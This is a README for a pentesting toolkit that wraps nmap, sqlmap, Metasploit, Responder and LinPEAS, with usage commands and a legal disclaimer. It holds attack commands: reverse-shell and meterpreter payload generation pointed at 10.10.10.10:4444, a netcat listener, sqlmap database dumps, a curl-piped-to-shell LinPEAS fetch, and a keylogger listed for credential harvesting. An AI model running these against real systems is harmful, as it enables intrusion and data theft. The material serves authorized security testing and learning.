# 🛡️ Ghost Toolkit Scripts 👻

<p align="center">
  <img src="https://img.shields.io/badge/Made%20for-Pentesters-blue?style=for-the-badge&logo=security" alt="Pentesters">
  <img src="https://img.shields.io/badge/Tools-70%2B-green?style=for-the-badge" alt="70+ Tools">
  <img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge" alt="License">
  <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20macOS-orange?style=for-the-badge" alt="Platform">
  <img src="https://img.shields.io/badge/Docker-Supported-blue?style=for-the-badge&logo=docker" alt="Docker">
  <img src="https://img.shields.io/badge/Terraform-Cloud%20Labs-green?style=for-the-badge&logo=terraform" alt="Terraform">
</p>

<p align="center">
  <a href="https://github.com/joemunene-by/ghost-toolkit-scripts/stargazers"><img src="https://img.shields.io/github/stars/joemunene-by/ghost-toolkit-scripts?style=social" alt="Stars"></a>
  <a href="https://github.com/joemunene-by/ghost-toolkit-scripts/fork"><img src="https://img.shields.io/github/forks/joemunene-by/ghost-toolkit-scripts?style=social" alt="Forks"></a>
  <a href="https://github.com/joemunene-by/ghost-toolkit-scripts/issues"><img src="https://img.shields.io/github/issues/joemunene-by/ghost-toolkit-scripts" alt="Issues"></a>
</p>

---

**Keywords:** penetration-testing, security-tools, ethical-hacking, cybersecurity, nmap, sqlmap, metasploit, kali-linux, network-scanner, vulnerability-scanner, pentest-toolkit, security-framework, infosec, hacking-tools, oscp-prep, bug-bounty, recon, exploitation, forensics

---

```
 ██████╗██╗   ██╗██████╗ ███████╗██████╗     ██████╗ ███████╗ ██████╗ 
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██╔════╝██╔════╝ 
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ██████╔╝█████╗  ██║      
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ██╔══██╗██╔══╝  ██║      
╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ██║  ██║███████╗╚██████╗ 
 ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚══════╝ ╚═════╝ 
                                                                       
    ██████╗ ███████╗██╗   ██╗    ██████╗  ██████╗  ██████╗ ████████╗ 
    ██╔══██╗██╔════╝██║   ██║    ██╔══██╗ ██╔═══██╗██╔═══██╗╚══██╔══╝ 
    ██║  ██║█████╗  ██║   ██║    ██████╔╝ ██║   ██║██║   ██║   ██║    
    ██║  ██║██╔══╝  ╚██╗ ██╔╝    ██╔══██╗ ██║   ██║██║   ██║   ██║    
    ██████╔╝███████╗ ╚████╔╝     ██║  ██║ ╚██████╔╝╚██████╔╝   ██║    
    ╚═════╝ ╚══════╝  ╚═══╝      ╚═╝  ╚═╝  ╚═════╝  ╚═════╝    ╚═╝    
```

---

## 📋 Table of Contents

1. [Introduction](#introduction)
2. [What is Penetration Testing?](#what-is-penetration-testing)
3. [Features](#features)
4. [Quick Start](#quick-start)
5. [Tool Categories](#tool-categories)
   - [Network Tools](#network-tools-9)
   - [Web Security Tools](#web-security-tools-7)
   - [Password Attacks](#password-attacks-5)
   - [Exploitation Tools](#exploitation-tools-6)
   - [Forensics \& OSINT](#forensics--osint-6)
   - [Defense \& Monitoring](#defense--monitoring-3)
   - [Utilities](#utilities-7)
   - [Ghost Repositories](#ghost-repositories-15)
6. [Detailed Tool Documentation](#detailed-tool-documentation)
7. [Usage Examples](#usage-examples)
   - [Network Scanning Workflow](#network-scanning-workflow)
   - [Web Application Testing](#web-application-testing)
   - [Password Cracking](#password-cracking)
   - [Privilege Escalation](#privilege-escalation)
8. [Installation](#installation)
   - [Prerequisites](#prerequisites)
   - [Automated Setup](#automated-setup)
   - [Manual Installation](#manual-installation)
9. [Directory Structure](#directory-structure)
10. [Use Cases](#use-cases)
11. [Troubleshooting](#troubleshooting)
12. [Legal Disclaimer](#legal-disclaimer)
13. [Contributing](#contributing)
14. [FAQ](#faq)
15. [Changelog](#changelog)
16. [Credits](#credits)
17. [License](#license)

---

## 📖 Introduction

**Ghost Toolkit Scripts** is a comprehensive, production-ready cybersecurity toolkit designed for:

- 🔴 **Penetration Testers** - Security professionals conducting authorized security assessments
- 🛡️ **Security Researchers** - Experts investigating vulnerabilities and exploits
- 👨‍💻 **System Administrators** - IT professionals securing their infrastructure
- 🎓 **Students** - Those learning cybersecurity and ethical hacking
- 🔍 **Bug Bounty Hunters** - Researchers finding vulnerabilities for rewards

### Our Mission

To provide a unified, easy-to-use toolkit that combines the best open-source security tools into one cohesive framework. Ghost Toolkit simplifies the process of setting up and managing security tools, allowing professionals to focus on what matters most - finding vulnerabilities.

### Why Ghost Toolkit?

| Feature | Benefit |
|---------|---------|
| **60+ Tools** | Everything you need in one place |
| **Automated Setup** | Get started in minutes, not hours |
| **Categorized Interface** | Find the right tool quickly |
| **Regular Updates** | Stay current with latest tools |
| **Open Source** | Free to use and modify |
| **Active Development** | Continuously improving |

---

## 🔐 What is Penetration Testing?

Penetration testing (pentesting) is an authorized simulated cyberattack on a computer system, performed to evaluate the security of the system. Pentests are used to:

- ✅ Identify vulnerabilities before malicious actors do
- ✅ Test the effectiveness of security controls
- ✅ Meet compliance requirements (PCI-DSS, HIPAA, SOC 2)
- ✅ Improve overall security posture

### Types of Pentesting

| Type | Description |
|------|-------------|
| **Black Box** | No prior knowledge of the target |
| **White Box** | Full knowledge of the system |
| **Gray Box** | Limited knowledge (most common) |
| **Internal** | Testing from inside the network |
| **External** | Testing from outside the network |

### The Methodology

```
┌─────────────────────────────────────────────────────────────────┐
│                    PENTEST METHODOLOGY                          │
├─────────────────────────────────────────────────────────────────┤
│  1. RECONNAISSANCE     →  Information Gathering                │
│  2. SCANNING           →  Port, Service, Vulnerability Scan    │
│  3. ENUMERATION        →  Identifying Users, Shares, etc.      │
│  4. EXPLOITATION       →  Gaining Access                       │
│  5. POST-EXPLOITATION  →  Privilege Escalation, Pivoting      │
│  6. DOCUMENTATION      →  Reporting                            │
└─────────────────────────────────────────────────────────────────┘
```

Ghost Toolkit supports all phases of penetration testing!

---

## ✨ Features

- **60+ Security Tools** - Comprehensive coverage of all pentesting needs
- **Docker Support** - Run in isolated containers anywhere
- **Cloud Lab Templates** - Deploy practice environments on AWS/DigitalOcean
- **Automated Setup** - One-command installation of all tools and dependencies
- **Interactive Launcher** - User-friendly menu system for easy tool access
- **One-Click Updates** - Keep all tools up-to-date with a single command
- **Report Generator** - Create professional HTML pentest reports
- **Shell Aliases** - Quick commands (gnmap, gsql, etc.)
- **Auto-Update Checker** - Stay current with latest tools
- **GitHub Actions CI/CD** - Quality assurance and testing
- **Defense Tools** - Monitoring and detection capabilities
- **Forensics Tools** - Digital forensics and incident response

---

## 🚀 Quick Start

### Traditional Installation

```bash
# Clone the repository
git clone https://github.com/joemunene-by/ghost-toolkit-scripts.git
cd ghost-toolkit-scripts

# Make scripts executable
chmod +x ghost_setup.sh ghost_launcher.sh ghost_update.sh

# Run the automated setup
sudo ./ghost_setup.sh

# Launch the toolkit
./ghost_launcher.sh
```

### Docker Installation (Recommended)

```bash
# Build the image
./docker-ghost.sh build

# Run interactively
./docker-ghost.sh run

# Or use docker-compose
./docker-ghost.sh start
```

### First Scan Example

```bash
# After setup, try a simple network scan
./tools/network/ghost_nmap.sh -t 192.168.1.1 -s fast
```

### Using Shell Aliases

```bash
# Source the aliases file
source config/ghost_aliases.sh

# Now use quick commands
gnmap -t 192.168.1.1 -s fast    # Nmap scan
gsql -t "http://target.com" --dbs  # SQLMap
gshell -l 10.10.10.10 -p 4444     # Generate shell
greport -c "Company" -t "target.com"  # Generate report
```

### Cloud Lab Deployment

```bash
# Deploy practice lab on AWS
cd terraform
terraform init
terraform apply

# Or DigitalOcean
cd terraform
terraform init -backend-config="token=YOUR_DO_TOKEN"
terraform apply
```

---

## 🐳 Docker Usage

Run Ghost Toolkit in an isolated Docker container:

```bash
# Build the Docker image
./docker-ghost.sh build

# Run interactively
./docker-ghost.sh run

# Start services (with docker-compose)
./docker-ghost.sh start

# Get shell inside container
./docker-ghost.sh shell

# View logs
./docker-ghost.sh logs

# Stop services
./docker-ghost.sh stop

# Clean up
./docker-ghost.sh clean
```

### Docker Options

| Command | Description |
|---------|-------------|
| `build` | Build Docker image |
| `run` | Run container interactively |
| `start` | Start with docker-compose |
| `stop` | Stop services |
| `shell` | Get shell access |
| `logs` | View container logs |
| `clean` | Remove containers & image |

### Docker Features

- Pre-installed security tools
- SecLists wordlists included
- Ghost repos cloned
- Non-root user (ghost)
- Persistent volumes for scans/payloads

---

## ☁️ Cloud Lab Deployment

Deploy a practice penetration testing environment:

### AWS

```bash
cd terraform
terraform init
terraform plan
terraform apply
```

Creates:
- VPC with public/private subnets
- Attack machine (Kali/Ubuntu with Ghost Toolkit)
- Target machines (web app, Linux)
- Security groups configured

### DigitalOcean

```bash
cd terraform
export DO_TOKEN=your_token
terraform init
terraform apply
```

---

## 🔧 Shell Aliases

Quick commands for fast access:

```bash
# Source aliases
source config/ghost_aliases.sh

# Network tools
gnmap -t 192.168.1.1 -s fast    # Nmap quick scan
gmasscan                          # Masscan
garp                             # ARP scanner
gdirb                            # Directory busting
gssl                             # SSL analysis

# Web tools
gsql -t "http://target" --dbs   # SQLMap
gnikto                           # Nikto scan
gnuclei                          # Nuclei scan
gdalfox                         # XSS scanner
gwpscan                         # WordPress scan

# Exploitation
gshell -l IP -p 4444            # Generate reverse shell
gmsf                            # Metasploit helper
glinpeas                        # Linux privesc
gpspy                           # Process spy

# Utilities
gpassgen -l 20                  # Generate passwords
grecon target.com               # Reconnaissance
greport -c "Company" -t "target" # Generate report

# Main scripts
ghost                           # Launch menu
ghost-update                    # Update all
ghost-monitor                   # System monitor
```

---

## 📊 Tool Categories

| Tool | Description | Use Case |
|------|-------------|----------|
| **Nmap Pro** | Advanced port scanner with multiple scan types | Network discovery, port enumeration |
| **Masscan** | Ultra-fast port scanner | Large network scanning |
| **ARP Scanner** | Local network host discovery | Finding live hosts |
| **Directory Scanner** | Web directory enumeration | Finding hidden files/folders |
| **SSL/TLS Analyzer** | Certificate and protocol analysis | Finding SSL vulnerabilities |
| **Subdomain Enumerator** | Subdomain discovery | Attack surface enumeration |
| **DNS Enumerator** | DNS zone transfer and records | DNS reconnaissance |
| **Advanced Port Scanner** | GUI-based port scanning | Detailed scanning |
| **DNS Lookup** | Domain intelligence gathering | Information gathering |

### Web Security Tools (7)

| Tool | Description | Use Case |
|------|-------------|----------|
| **SQL Injection (sqlmap)** | Automated SQL injection testing | Finding SQLi vulnerabilities |
| **Web Vulnerability Scanner (nikto)** | General web vuln scanning | Finding misconfigurations |
| **CMS Scanner** | Drupal/Joomla identification | CMS-specific vulnerabilities |
| **WhatWeb** | Technology fingerprinting | Identifying web technologies |
| **WPScan** | WordPress security scanner | WordPress vulnerabilities |
| **Port Scanner (Web UI)** | Web-based port scanning | User-friendly scanning |
| **Vulnerability Scanner** | General vulnerability detection | Finding CVEs |

### Password Attacks (5)

| Tool | Description | Use Case |
|------|-------------|----------|
| **Hydra Bruteforce** | Multi-service brute force | Password cracking |
| **Hash Identifier** | Hash type identification | Determining hash algorithms |
| **Hash Cracker** | Dictionary-based cracking | Password recovery |
| **MAC Spoofer** | MAC address randomization | Anonymity |
| **WiFi Tool** | Wireless attack toolkit | WiFi security testing |

### Exploitation Tools (6)

| Tool | Description | Use Case |
|------|-------------|----------|
| **Reverse Shell Generator** | Multiple reverse shell payloads | Getting shell access |
| **Payload Encoder** | Encoding obfuscation | Bypassing filters |
| **Metasploit Helper** | msfconsole & msfvenom | Exploitation framework |
| **Responder** | LLMNR/NBT-NS spoofing | Lateral movement |
| **LinPEAS** | Linux privilege escalation | Finding privesc vectors |
| **Keylogger** | Keystroke monitoring | Credential harvesting |

### Forensics & OSINT (6)

| Tool | Description | Use Case |
|------|-------------|----------|
| **Image Forensics** | EXIF, stego detection | Digital forensics |
| **Strings Analyzer** | Binary analysis | Malware analysis |
| **Volatility** | Memory forensics | RAM analysis |
| **Steganography Tool** | Hidden data extraction | Stego detection |
| **Metadata Scrubber** | EXIF removal | Privacy protection |
| **Caesar Cipher Tool** | Classical cipher tool | Cryptography learning |

### Defense & Monitoring (3)

| Tool | Description | Use Case |
|------|-------------|----------|
| **Process Monitor** | Live system monitoring | Detecting anomalies |
| **Log Watcher** | Real-time log alerting | Intrusion detection |
| **File Integrity** | Tripwire-style monitoring | Detecting changes |

### Utilities (7)

| Tool | Description | Use Case |
|------|-------------|----------|
| **Password Generator** | Secure password creation | Credential generation |
| **Network Recon** | DNS/GeoIP/Whois | Information gathering |
| **File Hasher** | Hash calculation | File verification |
| **Port Knocker** | Port knocking daemon | Secure access |
| **Tor Setup** | Tor configuration | Anonymity |
| **Pentest Oneliners** | 50+ ready commands | Quick operations |
| **Base64 Converter** | Encoding/decoding | Data transformation |

### Ghost Repositories (15)

Custom tools developed by [joemunene-by](https://github.com/joemunene-by):

| Repository | Description |
|------------|-------------|
| Port-scanner | Modern web-based port scanner |
| Advanced Port Scanner | Python-based detailed scanner |
| Hash Cracker | Professional hash cracking framework |
| MAC Spoofer | Advanced MAC address management |
| SentinelPulse | Real-time threat intelligence |
| Steganography-tool | LSB steganography |
| Network-Traffic-Analyzer | Enterprise-grade packet analysis |
| Metadata Scrubber | EXIF/metadata removal |
| Caesar Cipher Tool | Educational cipher tool |
| Vulnerabilities-Scanner | Static secret scanning |
| DNS-Lookup-and-Domain-Intelligence-Tool | DNS reconnaissance |
| Key-logger | Surveillance suite (educational) |
| ghost-dashboard-v4 | Unified dashboard |
| Simple-Vulnerabilities-Scanner | Lightweight scanner |
| ai-coding-assistant | AI-powered development |

---

## 📚 Detailed Tool Documentation

### Network Scanning

#### Nmap Pro

The Swiss Army knife of network scanning.

```bash
# Basic usage
./tools/network/ghost_nmap.sh -t 192.168.1.1

# Fast scan (top 100 ports)
./tools/network/ghost_nmap.sh -t 192.168.1.1 -s fast

# Full port scan
./tools/network/ghost_nmap.sh -t 192.168.1.1 -s full

# Stealth SYN scan
./tools/network/ghost_nmap.sh -t 192.168.1.1 -s stealth

# Vulnerability scan
./tools/network/ghost_nmap.sh -t 192.168.1.1 -s vuln
```

#### Masscan

For scanning large networks quickly.

```bash
# Quick port scan
./tools/network/ghost_masscan.sh -t 10.0.0.1/24

# Specific ports
./tools/network/ghost_masscan.sh -t 10.0.0.1 -p "80,443,22,3389"
```

### Web Application Testing

#### SQL Injection with sqlmap

```bash
# Basic test
./tools/web/ghost_sqlmap.sh -t "http://target.com/page.php?id=1"

# Enumerate databases
./tools/web/ghost_sqlmap.sh -t "http://target.com/page.php?id=1" --dbs

# Dump data
./tools/web/ghost_sqlmap.sh -t "http://target.com/page.php?id=1" --dump
```

### Exploitation

#### Reverse Shell Generator

```bash
# Bash reverse shell
./tools/exploitation/ghost_shell.sh -l 10.10.10.10 -p 4444 -s bash

# Python reverse shell
./tools/exploitation/ghost_shell.sh -l 10.10.10.10 -p 4444 -s python

# PHP reverse shell
./tools/exploitation/ghost_shell.sh -l 10.10.10.10 -p 4444 -s php

# PowerShell reverse shell
./tools/exploitation/ghost_shell.sh -l 10.10.10.10 -p 4444 -s powershell
```

#### Metasploit Payload Generation

```bash
# Linux x64 shell
./tools/exploitation/ghost_msf.sh payload linux/x64/shell_reverse_tcp lhost 10.10.10.10 lport 4444

# Windows meterpreter
./tools/exploitation/ghost_msf.sh payload windows/meterpreter/reverse_tcp lhost 10.10.10.10 lport 4444 -f exe

# PHP meterpreter
./tools/exploitation/ghost_msf.sh payload php/meterpreter_reverse_tcp lhost 10.10.10.10 lport 4444
```

### Privilege Escalation

#### LinPEAS

```bash
# Basic scan
./tools/exploitation/ghost_linpeas.sh

# With color output
./tools/exploitation/ghost_linpeas.sh -c

# Quiet mode
./tools/exploitation/ghost_linpeas.sh -q
```

### Forensics

#### Image Forensics

```bash
# Basic analysis
./tools/forensics/ghost_forensics.sh -f image.jpg

# Extract hidden data
./tools/forensics/ghost_forensics.sh -f image.jpg -e

# Brute force passphrase
./tools/forensics/ghost_forensics.sh -f image.jpg -b
```

---

## 💡 Usage Examples

### Network Scanning Workflow

```bash
# 1. Discover live hosts
./tools/network/ghost_nmap.sh -t 192.168.1.0/24 -s fast

# 2. Port scan discovered hosts
./tools/network/ghost_masscan.sh -t 192.168.1.5 -p "1-1000"

# 3. Service version detection
./tools/network/ghost_nmap.sh -t 192.168.1.5 -s service

# 4. Vulnerability scanning
./tools/network/ghost_nmap.sh -t 192.168.1.5 -s vuln
```

### Web Application Testing

```bash
# 1. Fingerprint the target
./tools/web/ghost_whatweb.sh -t http://target.com

# 2. Directory enumeration
./tools/web/ghost_dirb.sh -t http://target.com

# 3. Vulnerability scanning
./tools/web/ghost_nikto.sh -t http://target.com

# 4. SQL injection testing
./tools/web/ghost_sqlmap.sh -t "http://target.com/page.php?id=1" --dbs
```

### Password Cracking

```bash
# 1. Identify hash type
./tools/password/ghost_hashid.sh -h 5d41402abc4b2a76b9719d911017c592

# 2. Create wordlist (optional)
./tools/utilities/ghost_passgen.sh -l 12 -c 1000 > wordlist.txt

# 3. Crack the hash
cd ~/ghost_toolkit/Hash-Cracker-Dictionary-Brute- && python3 main.py
```

### Privilege Escalation

```bash
# 1. On target machine, download and run LinPEAS
./tools/exploitation/ghost_linpeas.sh

# 2. Or for quick check
curl -Ls https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linpeas/linpeas.sh | sh
```

---

## 📦 Installation

### Prerequisites

#### System Requirements

| Requirement | Minimum | Recommended |
|-------------|---------|-------------|
| OS | Ubuntu 20.04+ / Debian 11+ | Ubuntu 22.04 LTS |
| RAM | 4 GB | 8 GB |
| Storage | 20 GB | 50 GB |
| Internet | Required | Stable connection |

#### Required Packages

```bash
# Core tools
sudo apt update
sudo apt install -y \
    git \
    python3 \
    python3-pip \
    nodejs \
    npm \
    curl \
    wget \
    build-essential

# Network tools
sudo apt install -y \
    nmap \
    masscan \
    net-tools \
    iputils-ping \
    arp-scan \
    dnsutils

# Web security tools
sudo apt install -y \
    nikto \
    dirb \
    gobuster \
    whatweb \
    wpscan

# Password tools
sudo apt install -y \
    hydra \
    john \
    hashcat

# Forensics tools
sudo apt install -y \
    steghide \
    binwalk \
    exiftool \
    foremost \
    imagemagick

# Other tools
sudo apt install -y \
    sslscan \
    responder \
    aircrack-ng \
    tor \
    proxychains
```

### Automated Setup

```bash
# Clone and run
git clone https://github.com/joemunene-by/ghost-toolkit-scripts.git
cd ghost-toolkit-scripts
chmod +x ghost_setup.sh
sudo ./ghost_setup.sh
```

The setup script will:
1. ✅ Check and install missing dependencies
2. ✅ Clone all Ghost repositories
3. ✅ Install Python/Node.js dependencies
4. ✅ Create necessary directories

### Manual Installation

```bash
# 1. Install dependencies
sudo apt update && sudo apt install -y git python3 pip3 nmap sqlmap nikto hydra

# 2. Clone repository
git clone https://github.com/joemunene-by/ghost-toolkit-scripts.git
cd ghost-toolkit-scripts

# 3. Clone tool repositories
mkdir -p ~/ghost_toolkit
cd ~/ghost_toolkit
git clone https://github.com/joemunene-by/Port-scanner
git clone https://github.com/joemunene-by/advanced-port-scanner
# ... (other repos)

# 4. Make scripts executable
cd ghost-toolkit-scripts
chmod +x ghost_*.sh tools/**/*.sh
```

---

## 📂 Directory Structure

```
ghost-toolkit-scripts/
├── 📜 ghost_setup.sh              # Main setup script
├── 📜 ghost_launcher.sh           # Interactive menu (60+ tools)
├── 📜 ghost_update.sh             # Update all tools
├── 📜 ghost_monitor.sh            # System diagnostics
├── 📜 diskwarn.sh                # Single disk monitor
├── 📜 diskwarn2.sh               # Multi-disk monitor
├── 📁 tools/                      # Tool scripts
│   ├── 📁 network/               # 9 network tools
│   │   ├── ghost_nmap.sh
│   │   ├── ghost_masscan.sh
│   │   ├── ghost_arp.sh
│   │   ├── ghost_dirb.sh
│   │   ├── ghost_ssl.sh
│   │   ├── ghost_subdomain.sh
│   │   ├── ghost_dnsenum.sh
│   │   ├── ghost_ping sweep.sh
│   │   └── ghost_network_discovery.sh
│   ├── 📁 web/                   # 7 web tools
│   │   ├── ghost_sqlmap.sh
│   │   ├── ghost_nikto.sh
│   │   ├── ghost_cms.sh
│   │   ├── ghost_whatweb.sh
│   │   ├── ghost_wpscan.sh
│   │   ├── ghost_dirb.sh
│   │   └── ghost_subjack.sh
│   ├── 📁 password/              # 5 password tools
│   │   ├── ghost_hydra.sh
│   │   ├── ghost_hashid.sh
│   │   ├── ghost_wifi.sh
│   │   ├── ghost_cracker.sh
│   │   └── ghost_passgen.sh
│   ├── 📁 exploitation/          # 6 exploitation tools
│   │   ├── ghost_shell.sh
│   │   ├── ghost_encoder.sh
│   │   ├── ghost_msf.sh
│   │   ├── ghost_responder.sh
│   │   ├── ghost_linpeas.sh
│   │   └── ghost_powershell.sh
│   ├── 📁 forensics/             # 6 forensics tools
│   │   ├── ghost_forensics.sh
│   │   ├── ghost_strings.sh
│   │   ├── ghost_volatility.sh
│   │   ├── ghost_stego.sh
│   │   ├── ghost_binwalk.sh
│   │   └── ghost_exiftool.sh
│   ├── 📁 defense/              # 3 defense tools
│   │   ├── ghost_procmon.sh
│   │   ├── ghost_logwatch.sh
│   │   └── ghost_integrity.sh
│   └── 📁 utilities/            # 7 utilities
│       ├── ghost_passgen.sh
│       ├── ghost_recon.sh
│       ├── ghost_hasher.sh
│       ├── ghost_portknock.sh
│       ├── ghost_tor.sh
│       ├── ghost_oneliners.sh
│       └── ghost_converter.sh
├── 📁 docs/                      # Documentation
├── 📁 scripts/                   # Additional scripts
├── 📁 scans/                    # Scan results (created at runtime)
├── 📁 payloads/                 # Generated payloads (created at runtime)
├── 📜 LICENSE
└── 📜 README.md
```

---

## 🎯 Use Cases

### 1. Internal Network Audit

```bash
# Step 1: Discover all devices
./tools/network/ghost_nmap.sh -t 192.168.1.0/24 -s fast

# Step 2: Scan for vulnerabilities
./tools/network/ghost_nmap.sh -t 192.168.1.0/24 -s vuln

# Step 3: Check SSL/TLS
./tools/network/ghost_ssl.sh -t 192.168.1.1
```

### 2. Web Application Security Test

```bash
# Step 1: Enumerate subdomains
./tools/network/ghost_subdomain.sh -d target.com

# Step 2: Scan for vulnerabilities
./tools/web/ghost_nikto.sh -t http://target.com

# Step 3: Test for SQL injection
./tools/web/ghost_sqlmap.sh -t "http://target.com/page?id=1" --dump
```

### 3. Red Team Engagement

```bash
# Step 1: Initial access - generate payload
./tools/exploitation/ghost_msf.sh payload linux/x64/meterpreter_reverse_tcp lhost 10.10.10.10 lport 4444

# Step 2: Get shell - start listener
nc -lvp 4444

# Step 3: Privilege escalation
./tools/exploitation/ghost_linpeas.sh

# Step 4: Lateral movement
./tools/exploitation/ghost_responder.sh -i eth0
```

### 4. Digital Forensics Investigation

```bash
# Step 1: Analyze image
./tools/forensics/ghost_forensics.sh -f evidence.jpg -e

# Step 2: Extract strings
./tools/forensics/ghost_strings.sh -f malware.exe -m all

# Step 3: Memory analysis (if applicable)
./tools/forensics/ghost_volatility.sh -m memory.raw -c pslist
```

### 5. Security Monitoring

```bash
# Step 1: Monitor processes
./tools/defense/ghost_procmon.sh -i 2 -l 100

# Step 2: Watch logs
./tools/defense/ghost_logwatch.sh -l /var/log/auth.log -p "failed|denied"

# Step 3: Check file integrity
./tools/defense/ghost_integrity.sh -m check -d /var/www
```

---

## 🔧 Troubleshooting

### Common Issues

#### Issue: "Permission Denied" when running scripts

```bash
# Fix: Make scripts executable
chmod +x ghost_*.sh tools/**/*.sh
```

#### Issue: "Command not found" for tools

```bash
# Fix: Install missing tools
sudo apt install -y <tool-name>

# Or run setup again
sudo ./ghost_setup.sh
```

#### Issue: Repository clone failures

```bash
# Fix: Check internet connection
ping github.com

# Or manually clone
git clone https://github.com/joemunene-by/<repo-name>.git
```

#### Issue: Module not found errors

```bash
# Fix: Install Python dependencies
pip3 install -r requirements.txt --break-system-packages

# Or for Node.js
npm install
```

#### Issue: masscan requires root

```bash
# Fix: Run with sudo
sudo ./tools/network/ghost_masscan.sh -t 10.0.0.1
```

### Getting Help

- 📧 Open an issue: [GitHub Issues](https://github.com/joemunene-by/ghost-toolkit-scripts/issues)
- 💬 Check discussions: [GitHub Discussions](https://github.com/joemunene-by/ghost-toolkit-scripts/discussions)
- 📖 Read documentation: [Wiki](https://github.com/joemunene-by/ghost-toolkit-scripts/wiki)

---

## ⚖️ Legal Disclaimer

### Important Warning

⚠️ **FOR AUTHORIZED SECURITY TESTING ONLY!**

By using Ghost Toolkit, you agree to the following:

1. **Authorized Use Only** - Only use on systems you own or have explicit written permission to test. Unauthorized access is illegal and punishable under laws including but not limited to:
   - Computer Fraud and Abuse Act (CFAA) - USA
   - Computer Misuse Act (CMA) - UK
   - GDPR - EU
   - Local cyber laws in your jurisdiction

2. **No Liability** - The authors assume no liability for any damages caused by the use of this toolkit.

3. **Educational Purpose** - Tools are provided for legitimate security testing and educational purposes only.

4. **Risk Acceptance** - You accept all risks associated with using these tools.

### Best Practices

- ✅ Always get written authorization before testing
- ✅ Document all findings thoroughly
- ✅ Follow responsible disclosure guidelines
- ✅ Use on your own systems for learning
- ✅ Test in controlled lab environments

---

## 🤝 Contributing

We welcome contributions! Here's how you can help:

### Ways to Contribute

1. **Report Bugs** - Open an issue with detailed steps to reproduce
2. **Suggest Features** - Open an issue with your idea
3. **Add New Tools** - Submit a PR with new wrapper scripts
4. **Improve Documentation** - Fix typos, add examples
5. **Share Feedback** - Let us know what you think

### Adding New Tools

```bash
# 1. Create your tool script
# Follow the pattern in tools/<category>/

# 2. Add to launcher
# Edit ghost_launcher.sh to include your tool

# 3. Update README
# Add documentation for your tool

# 4. Submit PR
git checkout -b feature/my-new-tool
git add .
git commit -m "Add: My new tool"
git push origin feature/my-new-tool
```

### Code Style

- Use consistent indentation (4 spaces)
- Add comments for complex operations
- Include help flags (-h, --help)
- Handle errors gracefully

---

## ❓ FAQ

### Q: Is this legal?

**A:** Yes, when used for authorized security testing on systems you own or have permission to test. Always obtain written authorization before testing.

### Q: Do I need Kali Linux?

**A:** No, Ghost Toolkit works on any Linux distribution. However, it's optimized for Debian-based systems (Ubuntu, Kali, ParrotOS).

### Q: Why do some tools require sudo?

**A:** Certain network operations (raw sockets, port scanning, network monitoring) require elevated privileges for access to network interfaces.

### Q: Can I use this on Windows?

**A:** Ghost Toolkit is designed for Linux/macOS. For Windows, consider using WSL (Windows Subsystem for Linux) or a virtual machine.

### Q: How do I update all tools?

**A:** Run `./ghost_update.sh` to pull the latest versions of all tools and scripts.

### Q: Are these tools detected by antivirus?

**A:** Some exploitation tools may be flagged by antivirus. This is expected behavior - these tools can be used for both legitimate security testing and malicious purposes.

### Q: Can I contribute code?

**A:** Absolutely! See the Contributing section above.

### Q: How do I report a vulnerability in this project?

**A:** Please open a private security issue through GitHub's security advisories.

---

## 📝 Changelog

### v3.0.0 (Current)
- ✅ Added 21 new tools
- ✅ Expanded to 60+ total tools
- ✅ New Defense & Monitoring category
- ✅ Enhanced launcher with 8 categories
- ✅ Complete README overhaul

### v2.0.0
- ✅ Added categorized launcher
- ✅ New tool categories
- ✅ Updated ghost_setup.sh
- ✅ ghost_update.sh added

### v1.0.0
- ✅ Initial release
- ✅ 12 basic tools
- ✅ Basic launcher

---

## 👏 Credits

### Developers

- **Joe Munene** (@joemunene-by) - Creator and maintainer

### Open Source Projects

This toolkit leverages many open-source projects:

| Tool | Creator | License |
|------|---------|---------|
| Nmap | Fyodor | GPL |
| Metasploit | Rapid7 | BSD |
| sqlmap | Miroslav Stampar | GPL |
| nikto | CIRT.net | GPL |
| hydra | van Hauser/THC | AGPL |
| LinPEAS | carlospolop | GPL |
| responder | SpiderLabs | GPL |

### Inspiration

- Kali Linux
- Parrot Security OS
- PenTesters Framework (PTF)
- BlackArch

---

## 📄 License

MIT License

Copyright (c) 2024 Joe Munene (@joemunene-by)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

---

## 🔗 Links

- 📘 [GitHub Repository](https://github.com/joemunene-by/ghost-toolkit-scripts)
- 👤 [Author Profile](https://github.com/joemunene-by)
- 🐛 [Issue Tracker](https://github.com/joemunene-by/ghost-toolkit-scripts/issues)
- 💬 [Discussions](https://github.com/joemunene-by/ghost-toolkit-scripts/discussions)

---

<p align="center">
  Made with ❤️ by <a href="https://github.com/joemunene-by">Joe Munene</a>
  
  ⭐ Star us on GitHub | 🐛 Report Issues | 📧 Contact
</p>

<p align="center">
  <img src="https://komarev.com/ghpvc/?username=ghost-toolkit-scripts&label=Views&color=green" alt="Profile views">
</p>
